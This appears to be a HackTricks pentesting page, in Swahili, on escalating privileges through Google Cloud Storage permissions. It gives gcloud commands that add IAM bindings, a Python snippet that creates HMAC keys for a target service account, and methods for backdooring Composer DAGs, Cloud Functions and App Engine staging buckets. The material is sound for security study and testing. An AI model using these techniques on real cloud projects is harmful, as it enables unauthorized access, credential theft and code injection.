# GCP - Hifadhi Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Hifadhi

Taarifa za Msingi:

{{#ref}}
../gcp-services/gcp-storage-enum.md
{{#endref}}

### `storage.objects.get`

Ruhusa hii inakuwezesha **kupakua faili zilizohifadhiwa ndani ya Cloud Storage**. Hii inaweza kukuruhusu kupandisha ruhusa kwa sababu wakati mwingine **taarifa nyeti zimehifadhiwa huko**. Zaidi ya hayo, baadhi ya huduma za GCP huhifadhi taarifa zao ndani ya buckets:

- **GCP Composer**: Unapounda Composer Environment, **msimbo wa DAG zote** utahifadhiwa ndani ya **bucket**. DAG hizi zinaweza kuwa na taarifa za kuvutia ndani ya misimbo yao.
- **GCR (Container Registry)**: **Image** za containers zinahifadhiwa ndani ya **buckets**, ambayo ina maana kwamba ikiwa unaweza kusoma buckets hizo utaweza kupakua images na **kutafuta leaks na/au msimbo wa chanzo**.

### `storage.objects.setIamPolicy`

Hii inaweza kukupa ruhusa ya **kutitumia vibaya mojawapo ya matukio ya hapo juu**.
```bash
# Add binding
gcloud storage objects add-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Remove binding
gcloud storage objects remove-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Change Policy
gcloud storage objects set-iam-policy gs://<BUCKET_NAME>/<OBJECT_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
### **`storage.buckets.setIamPolicy`**

Kwa mfano wa jinsi ya kubadili ruhusa kwa kutumia ruhusa hii angalia ukurasa huu:
```bash
# Add binding
gcloud storage buckets add-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Remove binding
gcloud storage buckets remove-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Change policy
gcloud storage buckets set-iam-policy gs://<BUCKET_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
{{#ref}}
../gcp-unauthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md
{{#endref}}

### `storage.hmacKeys.create`

Sifa ya "interoperability" ya Cloud Storage, iliyobuniwa kwa ajili ya **maingiliano kati ya cloud** kama AWS S3, inahusisha **utengenezaji wa HMAC keys kwa Service Accounts na watumiaji**. Mshambuliaji anaweza kutumia hili kwa **kuunda HMAC key kwa Service Account yenye vibali vilivyoongezwa**, kwa hivyo **kuongeza hadhi ndani ya Cloud Storage**. Wakati HMAC keys zinazohusishwa na watumiaji zinaweza kupatikana tu kupitia web console, vifunguo vya access na secret vinabaki **kupatikana daima**, hivyo kuruhusu kuhifadhi ufikiaji kama chelezo. Kwa upande mwingine, HMAC keys zinazounganishwa na Service Account zinapatikana kupitia API, lakini vifunguo vya access na secret havipatikani baada ya kuundwa, ikiongeza ngazi ya ugumu kwa ajili ya ufikiaji wa kudumu.
```bash
# Create key
gsutil hmac create <sa-email> # You might need to execute this inside a VM instance

## If you have TROUBLES creating the HMAC key this was you can also do it contacting the API directly:
PROJECT_ID = '$PROJECT_ID'
TARGET_SERVICE_ACCOUNT = f"exam-storage-sa-read-flag-3@{PROJECT_ID}.iam.gserviceaccount.com"
ACCESS_TOKEN = "$CLOUDSDK_AUTH_ACCESS_TOKEN"
import requests
import json
key = requests.post(
f'https://www.googleapis.com/storage/v1/projects/{PROJECT_ID}/hmacKeys',
params={'access_token': ACCESS_TOKEN, 'serviceAccountEmail': TARGET_SERVICE_ACCOUNT}
).json()
#print(json.dumps(key, indent=4))
print(f'ID: {key["metadata"]["accessId"]}')
print(f'Secret: {key["secret"]}')


# Configure gsutil to use the HMAC key
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```
Script nyingine ya exploit kwa njia hii inapatikana [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py).

### `storage.objects.create`, `storage.objects.delete` = Idhini za Kuandika za Storage

Ili **kuunda kitu kipya** ndani ya bucket unahitaji `storage.objects.create` na, kulingana na [the docs](https://cloud.google.com/storage/docs/access-control/iam-permissions#object_permissions), unahitaji pia `storage.objects.delete` ili **kuhariri** kitu kilicho tayari.

Utekelezaji wa kawaida wa udhaifu kwenye buckets unapo kuwa na uwezo wa kuandika ni pale ambapo **bucket inahifadhi faili za web server**; unaweza kuwa na uwezo wa **kuweka code mpya** ambayo itatumika na web application.

### Composer

**Composer** ni **Apache Airflow** inayosimamiwa ndani ya GCP. Ina sifa kadhaa za kuvutia:

- Inakimbia ndani ya **GKE cluster**, hivyo **SA ambayo cluster inatumia inapatikana** kwa code inayokimbia ndani ya Composer
- Vifaa vyote vya environment za composer (**code of DAGs**, plugins na data) vinahifadhiwa ndani ya bucket ya GCP. Ikiwa mshambuliaji ana idhini za kusoma na kuandika juu yake, anaweza kufuatilia bucket na **kila wakati DAG inapotengenezwa au kusasishwa, akatuma toleo lenye backdoor** ili environment ya composer ipate kutoka storage toleo lenye backdoor.

Unaweza kupata PoC ya shambulio hili katika repo: [**https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs**](https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs)

### Cloud Functions

- Code za Cloud Functions zinalindwa ndani ya Storage na kila wakati toleo jipya linapotengenezwa code inasukumwa kwenye bucket kisha container mpya inajengwa kutoka kwa code hiyo. Kwa hiyo, **kufuta au kubadilisha code kabla toleo jipya halijajengwa kunawezekana kufanya cloud function itekeleze arbitrary code**.

Unaweza kupata PoC ya shambulio hili katika repo: [**https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions**](https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions)

### App Engine

Matoleo ya AppEngine yanazalisha data ndani ya bucket yenye muundo wa jina: `staging.<project-id>.appspot.com`. Ndani ya bucket hii, inawezekana kupata folda inayoitwa `ae` ambayo itaenda kuwa na folda kwa kila toleo la AppEngine app na ndani ya folda hizi utapata faili `manifest.json`. Faili hii ina json yenye orodha ya faili zote ambazo zinahitajika kutumiwa kuunda toleo husika. Zaidi ya hayo, inawezekana kupata **majina halisi ya faili, URL yao ndani ya GCP bucket (faili ndani ya bucket zilibadilishwa jina kwa sha1 hash) na sha1 hash ya kila faili.**

_Nota kuwa haiwezekani kuchukua bucket hii kabla kwa sababu watumiaji wa GCP hawaruhusiwi kuunda buckets kwa kutumia domain appspot.com._

Hata hivyo, kwa ufikiaji wa kusoma na kuandika kwenye bucket hii, inawezekana kuongezeka kwa ruhusa hadi SA iliyounganishwa na toleo la App Engine kwa kufuatilia bucket na kila wakati mabadiliko yanapotendeka (toleo jipya), kubadilisha toleo jipya haraka iwezekanavyo. Kwa njia hii, container inayoundwa kutoka kwa code hii itatekeleza code yenye backdoor.

Shambulio lililotajwa linaweza kufanywa kwa njia nyingi tofauti, zote zinaanzia kwa kufuatilia bucket `staging.<project-id>.appspot.com`:

- Pakia code mpya kamili ya toleo la AppEngine kwenye bucket nyingine iliyopo na inayopatikana na uandae faili ya **`manifest.json` na jina la bucket mpya na sha1 hashes yake**. Kisha, wakati toleo jipya linapotengenezwa ndani ya bucket, unachohitaji ni kubadilisha faili ya `manifest.json` na kupakia ile yenye madhara.
- Pakia toleo lililosahihishwa la `requirements.txt` litakalo tumia code ya dependencies yenye madhara na sasisha `manifest.json` na jina jipya la faili, URL na hash yake.
- Pakia **`main.py` au `app.yaml` iliyorekebishwa ambayo itatekeleza code yenye madhara** na sasisha `manifest.json` na jina jipya la faili, URL na hash yake.

Unaweza kupata PoC ya shambulio hili katika repo: [**https://github.com/carlospolop/Monitor-Backdoor-AppEngine**](https://github.com/carlospolop/Monitor-Backdoor-AppEngine)

### GCR

- **Google Container Registry** inahifadhi images ndani ya buckets, ikiwa unaweza **kuandika kwenye buckets hizo** unaweza kuwa na uwezo wa **kutembea kwa lateral hadi maeneo ambapo buckets hizo zinakimbizwa.**
- Bucket inayotumika na GCR itakuwa na URL inayofanana na `gs://<eu/usa/asia/nothing>.artifacts.<project>.appspot.com` (Subdomains za juu zinabainishwa [here](https://cloud.google.com/container-registry/docs/pushing-and-pulling)).

> [!TIP]
> Huduma hii imepitwa na wakati hivyo shambulio hili halitumiki tena. Zaidi ya hayo, Artifact Registry, huduma inayobadilisha hii, haisihifadhi images ndani ya buckets.

## **References**

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/#:\~:text=apiKeys.-,create,privileges%20than%20our%20own%20user.](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
